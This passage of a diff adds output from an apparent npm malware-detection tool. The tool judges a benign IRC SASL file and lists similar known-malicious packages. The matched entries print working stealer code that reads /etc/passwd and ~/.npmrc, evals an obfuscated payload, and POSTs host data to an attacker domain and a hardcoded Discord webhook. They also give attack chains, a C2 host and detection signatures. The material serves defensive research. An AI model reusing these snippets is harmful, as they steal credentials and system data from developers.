+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/coffea/0.4.29/package/lib/parser/Tag.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/coffea/0.4.29/package/lib/parser/parser.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/coffea/0.4.29/package/lib/plugins/005.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/coffea/0.4.29/package/lib/plugins/away.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/coffea/0.4.29/package/lib/plugins/cap-account-notify.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/coffea/0.4.29/package/lib/plugins/cap-away-notify.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/coffea/0.4.29/package/lib/plugins/cap-extended-join.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/coffea/0.4.29/package/lib/plugins/cap-sasl.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "cap-sasl_slice_1",
+          "code_snippet": "/*jslint node: true*/\n\"use strict\";\n\nmodule.exports = function () {\n    return function (irc) {\n        irc.sasl = {\n            method: '',\n            mechanism: function saslMechanism(mechanism, network, fn) {\n                if (typeof network ===  'function') { // (fn)\n                    fn = network;\n                    network = '';\n                }\n\n                irc.sasl.method = mechanism;\n\n                irc.write(\"AUTHENTICATE \" + mechanism, network, fn);\n            },\n            login: function saslLogin(account, password, network, fn) {\n                if (typeof network ===  'function') { // (fn)\n                    fn = network;\n                    network = '';\n                }\n\n                if (account === undefined && password === undefined) {\n                    // User didnt use SASL but we need to still \"auth\"\n                    irc.write(\"AUTHENTICATE *\", network, fn);\n                } else {\n                    var data = new Buffer(account+'\\u0000'+account+'\\u0000'+password);\n\n                    irc.write(\"AUTHENTICATE \" + data.toString('base64'), network, fn);\n                }\n            }\n        };\n    };\n};",
+          "is_malicious": false,
+          "malice_score": 0.4104756275812785,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code encodes IRC SASL authentication credentials by concatenating the account and password with null separators, then base64-encodes this data using Buffer. It sends the encoded credentials via the irc.write network API as an AUTHENTICATE command, enabling authentication with potentially sensitive user credentials over the network.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code implements IRC SASL authentication by encoding user credentials (account and password) in base64 and sending them via the irc.write API as part of the AUTHENTICATE command. This is a standard and expected behavior for IRC clients supporting SASL authentication. Unlike the known malicious patterns, this code does not read sensitive system files, does not exfiltrate data to external servers, does not execute obfuscated or eval-based payloads, nor does it manipulate environment variables or perform unauthorized data collection. The use of Buffer for base64 encoding credentials is legitimate in this context. The code requires explicit user credentials and does not perform any hidden or automatic data theft. Therefore, despite handling sensitive data, the behavior aligns with normal authentication procedures rather than malicious intent.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20250105_195714_456126_snippet_1",
+              "source_package": "@core-pas/cyb-core (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456126/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42592841386795044,
+              "code_similarity": 0.3710671067237854,
+              "behavior_similarity": 0.4807897210121155,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var etcpasswd = '/etc/passwd';\nlet base64data1 = '';\ntry {\n  if (fs.existsSync(etcpasswd)) {\n    var data1 = fs.readFileSync(etcpasswd, 'utf8');\n    let buff1 = Buffer.from(data1);\n    base64data1 = buff1.toString('base64');\n  }\n} catch (error) {\n  console.log('');\n}",
+                "code_behavior": "At import-time or runtime, the code checks for the existence of /etc/passwd, reads its contents using fs.readFileSync, encodes the data in base64, and stores the encoded string in a variable for later exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Reading /etc/passwd is unnecessary for typical npm package operation and is a common technique for credential theft or reconnaissance.",
+                  "violated_expectations": "Legitimate npm packages should not access or process sensitive system files such as /etc/passwd, especially outside of explicit system administration contexts.",
+                  "similar_legitimate_use": "System administration or auditing tools may read /etc/passwd for legitimate purposes, but general-purpose npm packages should not.",
+                  "key_indicators": [
+                    "Reads /etc/passwd file",
+                    "Base64 encodes contents of sensitive file",
+                    "Stores encoded data for later use"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime (when index.js is loaded/executed)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@core-pas/cyb-core",
+                  "package_manager": "npm",
+                  "package_versions": "9.9.9999 (as seen in cyb-core-9.9.9999.tgz)",
+                  "why_malicious": "The package is explicitly designed to exfiltrate highly sensitive system files—including /etc/passwd on Unix systems, the Windows SAM and SYSTEM hives, and Amazon EC2 instance credentials—to attacker-controlled endpoints. This demonstrates a clear intent to steal credentials, compromise cloud and on-premises systems, and enable remote access, representing a severe supply chain threat."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed or imported, triggering execution of index.js (npm) or setup.py (PyPI).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Initial execution of malicious code, enabling access to sensitive files and environment."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Sensitive files (/etc/passwd, SAM, SYSTEM) and cloud credentials are read and encoded in base64.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Preparation of sensitive data for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Encoded data and environment details are exfiltrated to attacker-controlled endpoints, such as Discord webhooks.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker receives credentials and system information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "A reverse shell is opened, allowing the attacker to execute arbitrary OS commands remotely.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Full system compromise and persistent remote access."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to /etc/passwd, Windows SAM, or SYSTEM files by npm or PyPI packages during install or import",
+                    "Base64 encoding of sensitive file contents immediately after reading system credential files",
+                    "Network requests to 169.254.169.254 (AWS EC2 metadata service) from package code",
+                    "Outbound HTTP POST requests to Discord webhooks (discord.com/api/webhooks/...)",
+                    "Execution of encrypted (base64) payloads via exec in setup.py"
+                  ],
+                  "file_indicators": [
+                    "index.js containing code that accesses /etc/passwd, SAM, or SYSTEM files",
+                    "setup.py with base64-encoded exec statements",
+                    "Hardcoded Discord webhook URLs in package code"
+                  ],
+                  "network_indicators": [
+                    "Connections to 169.254.169.254 (AWS EC2 metadata endpoint)",
+                    "Outbound HTTP POST requests to discord.com/api/webhooks/*",
+                    "Unexpected external network connections during package installation or import"
+                  ],
+                  "how_to_detect": "Monitor for package installation or import events where code accesses sensitive system files (e.g., /etc/passwd, Windows SAM/SYSTEM), encodes data in base64, or initiates outbound network requests to known exfiltration endpoints such as Discord webhooks or the AWS metadata service. Flag any setup.py or index.js files containing encrypted payloads (e.g., base64-encoded exec statements) or references to credential stores. Use network monitoring to detect unexpected connections to Discord, 169.254.169.254, or other suspicious domains during package installation or runtime. Automated detection systems should correlate file access, encoding, and network exfiltration behaviors to identify malicious packages."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.40622955560684204,
+              "code_similarity": 0.4604641795158386,
+              "behavior_similarity": 0.35199496150016785,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_788435_snippet_1",
+              "source_package": "eslint-scope (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_788435/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4015864133834839,
+              "code_similarity": 0.4159354567527771,
+              "behavior_similarity": 0.38723739981651306,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Malicious code (reconstructed from typical npm credential stealers)\nconst fs = require('fs');\nconst https = require('https');\nconst npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');\nhttps.request({\n  hostname: 'malicious-domain.com',\n  path: '/steal',\n  method: 'POST',\n  headers: { 'Content-Type': 'text/plain' }\n}, req => req.end(npmrc));",
+                "code_behavior": "At import-time, the code reads the user's ~/.npmrc file using fs.readFileSync, then sends its contents via an outbound HTTPS POST request to a hardcoded attacker-controlled domain, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses a sensitive credential file (~/.npmrc) without user interaction and immediately transmits its contents to an external, untrusted server. This is a direct indicator of credential theft.",
+                  "violated_expectations": "A legitimate linter or its submodules should only perform static code analysis and never access or transmit user credential files, nor initiate network requests during import.",
+                  "similar_legitimate_use": "Legitimate code may read configuration files for local processing, but it would never exfiltrate their contents to an external server, especially not at import-time and without user consent.",
+                  "key_indicators": [
+                    "Reads ~/.npmrc file using fs.readFileSync",
+                    "Accesses process.env.HOME to locate user directory",
+                    "Sends file contents via HTTPS POST to a hardcoded, non-official domain",
+                    "Network request is triggered automatically on import/require",
+                    "No user interaction or explicit opt-in required"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (main entry point of eslint-scope 3.7.2)",
+                  "required_permissions": [
+                    "filesystem (read access to user home directory)",
+                    "network (outbound HTTPS requests)",
+                    "environment_vars (access to HOME variable)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "eslint-scope",
+                  "package_manager": "npm",
+                  "package_versions": "3.7.2",
+                  "why_malicious": "The package was compromised by an attacker who injected code that steals the contents of the user's ~/.npmrc file, which may contain npm authentication tokens. This enables the attacker to harvest credentials and potentially compromise additional npm accounts, facilitating further supply chain attacks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or updates eslint-scope 3.7.2, which contains the injected malicious code in its main entry point.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious code is executed automatically when the package is imported or required."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious code reads the user's ~/.npmrc file to extract npm authentication credentials.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive credentials are loaded into memory and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The code sends the stolen credentials to an attacker-controlled server via an outbound HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives the user's npm credentials, enabling further compromise and supply chain attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to ~/.npmrc or other credential files during package import or install",
+                    "Outbound HTTPS requests to domains not associated with npm or the package author",
+                    "Unexpected file reads and network activity in static analysis or linter tools",
+                    "Automatic network communication triggered by import/require without user action"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entry point containing fs.readFileSync(process.env.HOME + '/.npmrc')",
+                    "Presence of code making HTTPS requests to hardcoded, non-official domains",
+                    "References to process.env.HOME in conjunction with credential file access"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not affiliated with npm or the package maintainer (e.g., 'malicious-domain.com')",
+                    "Connections to newly registered or previously unseen domains from package code",
+                    "Network activity initiated at import-time rather than in response to user actions"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access ~/.npmrc or other credential files and initiate outbound network requests during install or import. Flag any static analysis or linter tools that perform network operations or credential file access. Use endpoint detection and response (EDR) or runtime monitoring to detect unexpected file reads and network activity from npm package processes, especially those communicating with untrusted or hardcoded domains."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205441_219891_snippet_3",
+              "source_package": "Unknown (4 different names, all with identical code) (PyPI)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205441_219891/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4004664421081543,
+              "code_similarity": 0.43371686339378357,
+              "behavior_similarity": 0.36721599102020264,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Malicious JavaScript injected into index.js\nfunction FirstTime() {\n  // Remove all Discord cache to force re-authentication\n}\nfunction SendToWebhook(data) {\n  // Send stolen data to Discord webhook\n}\nfunction Login(credentials) {\n  // Exfiltrate login credentials\n}\nfunction ChangePassword(newPassword) {\n  // Exfiltrate new password\n}\nfunction ChangeEmail(newEmail) {\n  // Exfiltrate new email\n}\nfunction CreditCardAdded(cardInfo) {\n  // Exfiltrate credit card info\n}",
+                "code_behavior": "At Discord client startup, the overwritten index.js executes malicious hooks that remove cache (to force re-authentication), and intercept login, password change, email change, and credit card addition events, exfiltrating all captured data to the attacker's Discord webhook.",
+                "malice_analysis": {
+                  "why_suspicious": "Injecting credential-stealing hooks into a widely used application's startup script is a classic persistence and data theft technique, enabling ongoing theft of sensitive user data.",
+                  "violated_expectations": "Discord's index.js should not be modified by third-party packages, nor should it exfiltrate sensitive events such as credentials or payment information.",
+                  "similar_legitimate_use": "None; only Discord developers should modify these hooks, and legitimate plugins do not exfiltrate sensitive data.",
+                  "key_indicators": [
+                    "Overwriting of core application logic in index.js",
+                    "Credential and payment event interception",
+                    "Automated exfiltration to webhook",
+                    "Presence of non-standard functions (FirstTime, SendToWebhook, etc.)"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "Discord client startup (after index.js is overwritten)",
+                  "file_location": "Discord client index.js (overwritten by malware)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "process_injection"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (4 different names, all with identical code)",
+                  "package_manager": "PyPI",
+                  "package_versions": "All published versions (exact versions not specified)",
+                  "why_malicious": "The packages execute code at import-time to steal sensitive user information (including Discord credentials, email, phone, MFA status, and credit card info), exfiltrate it via Discord webhooks, tamper with Discord client startup scripts to persistently steal future credentials, and download and execute a malicious Windows executable that disables security tools and achieves persistence. This multi-stage attack chain results in both immediate and ongoing compromise of user accounts and the host system."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs and imports the malicious package, triggering import-time execution.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Initial data theft, Discord client tampering, and malware delivery."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Sensitive Discord user data is collected and exfiltrated to the attacker's Discord webhook.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives initial credentials and PII."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Discord client processes are terminated, and the startup script is overwritten with malicious hooks.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Persistence of credential theft on future Discord usage."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Discord client is restarted, and malicious JavaScript hooks intercept future credentials and payment events.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Ongoing exfiltration of sensitive data whenever the user interacts with Discord."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Malicious Windows executable is downloaded and executed.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "System-level compromise and persistence."
+                  },
+                  {
+                    "step": 6,
+                    "action": "Malicious executable disables security tools, achieves persistence, and maintains attacker access.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Long-term system compromise and data theft."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Python package executes code at import-time that accesses Discord client data directories and extracts user credentials or PII.",
+                    "Exfiltration of credentials and PII to Discord webhooks via HTTPS POST requests from non-Discord processes.",
+                    "Overwriting of Discord client index.js with credential-stealing JavaScript containing non-standard functions (e.g., FirstTime, SendToWebhook).",
+                    "Download and execution of remote Windows executables (e.g., pip_manager.exe) from Discord CDN URLs.",
+                    "Disabling of security tools and registry modification for persistence by unknown executables."
+                  ],
+                  "file_indicators": [
+                    "__init__.py containing code that accesses Discord directories or sends data to webhooks",
+                    "Overwritten Discord index.js with injected functions (FirstTime, SendToWebhook, Login, ChangePassword, ChangeEmail, CreditCardAdded)",
+                    "Downloaded pip_manager.exe in temporary directories (e.g., %TEMP%\\pip_manager.exe)",
+                    "Registry keys for Windows startup referencing pip_manager.exe (e.g., HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to Discord webhook URLs (https://discord.com/api/webhooks/...)",
+                    "Download requests to cdn.discordapp.com/attachments/...",
+                    "Unusual outbound traffic to Discord webhooks from Python or unknown processes"
+                  ],
+                  "how_to_detect": "Monitor for Python packages that execute code at import-time and access Discord client data directories. Flag any package that sends data to Discord webhooks or downloads executables from Discord CDN. Detect modifications to Discord's index.js file, especially the presence of non-standard functions such as FirstTime or SendToWebhook. On Windows, monitor for new startup items referencing unknown executables like pip_manager.exe and for processes that terminate security tools or Task Manager. Correlate outbound webhook traffic with recent package installations and alert on any exfiltration of credentials or PII to Discord webhooks."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205438_695471_snippet_1",
+              "source_package": "angulerjs (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205438_695471/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.39688199758529663,
+              "code_similarity": 0.41720476746559143,
+              "behavior_similarity": 0.37655919790267944,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// new.js (formatted)\nconst os = require('os');\nconst https = require('https');\nconst { execSync } = require('child_process');\nconst username = os.userInfo().username;\nconst hostname = os.hostname();\nlet ip = '';\ntry {\n  ip = execSync('curl -s ifconfig.me').toString().trim();\n} catch (e) {}\nconst data = JSON.stringify({ username, hostname, ip });\nconst options = {\n  hostname: 'discord.com',\n  path: '/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd-6YxHuUlZe91XSdfioky5-0e3gzeW4ztWskX1qYjSxzr',\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' }\n};\nconst req = https.request(options);\nreq.write(data);\nreq.end();",
+                "code_behavior": "At preinstall, the code collects the current user's username, hostname, and public IP address using os and child_process modules, then sends this data via HTTPS POST to a hardcoded Discord webhook endpoint, resulting in exfiltration of host information to an attacker-controlled server.",
+                "malice_analysis": {
+                  "why_suspicious": "The script is executed automatically during the npm package installation process, collects sensitive system and network information, and transmits it to an external Discord webhook without any user notification or consent. This behavior is a clear indicator of malicious intent, as it enables unauthorized data exfiltration at install-time.",
+                  "violated_expectations": "Legitimate npm packages do not collect or transmit host information during installation. Preinstall scripts are expected to perform setup or dependency checks, not to access user details or make outbound network requests to third-party endpoints.",
+                  "similar_legitimate_use": "Some legitimate tools may collect anonymized telemetry or error data, but only with explicit user consent and clear documentation. They do not exfiltrate sensitive host information silently during installation.",
+                  "key_indicators": [
+                    "Use of preinstall script to trigger code execution during installation",
+                    "Collection of username, hostname, and public IP address via os and child_process modules",
+                    "Outbound HTTPS POST request to a hardcoded Discord webhook endpoint",
+                    "No user notification, consent, or documentation of data collection",
+                    "Presence of new.js referenced in package.json preinstall field"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall",
+                  "file_location": "package.json (preinstall field) and new.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "angulerjs",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.3 (and all versions prior to 8.7.6)",
+                  "why_malicious": "The package is malicious because it surreptitiously collects sensitive host information (username, hostname, and public IP address) during installation and exfiltrates it to attacker-controlled endpoints without user knowledge or consent. It was distributed as part of a large-scale typosquatting campaign, mimicking popular libraries to deceive users and facilitate unauthorized data collection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package (e.g., angulerjs@1.1.3).",
+                    "implemented_by": [],
+                    "leads_to": "Triggers preinstall script execution."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The preinstall script (new.js) is executed, collecting username, hostname, and public IP address from the host system.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected data is sent via HTTPS POST to a Discord webhook controlled by the attacker.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive host information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "If index.js is executed (manually or by other means), it collects the same information and sends it to hits.dwyl.com.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Provides an alternate exfiltration channel for the attacker."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm preinstall scripts that collect and exfiltrate system information (username, hostname, public IP) during installation",
+                    "Outbound network requests to Discord webhooks or suspicious domains (e.g., hits.dwyl.com) from installation scripts",
+                    "Presence of redundant exfiltration logic in both preinstall scripts and main entry points (e.g., new.js and index.js)"
+                  ],
+                  "file_indicators": [
+                    "package.json with preinstall field referencing suspicious scripts such as new.js",
+                    "new.js or index.js files containing combined use of os, https, and child_process modules for data collection and transmission",
+                    "Hardcoded references to external domains such as discord.com/api/webhooks or hits.dwyl.com in JavaScript files"
+                  ],
+                  "network_indicators": [
